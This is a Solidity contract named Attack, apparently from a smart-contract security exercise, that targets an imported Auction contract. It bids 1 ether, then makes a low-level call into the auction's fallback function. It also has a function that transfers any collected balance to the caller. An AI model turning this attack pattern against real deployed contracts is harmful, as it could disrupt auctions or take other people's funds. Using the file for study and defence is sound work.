// SPDX-License-Identifier: MIT
pragma solidity ^0.6.0;
import "./Auction.sol";


contract Attack {
    Auction auc;

    constructor(address payable _addr) public payable {
        auc = Auction(_addr);
    }

    function attackAuc() public payable {
        auc.bid{ value: 1 ether}();
        (bool success,) = address(auc).call(abi.encodeWithSignature("fallback()"));
        require(success);
    }

    function getBalance() public view returns (uint) {
        return address(this).balance;
    }

    function getFunds() public {
        msg.sender.transfer(address(this).balance);
    }    
}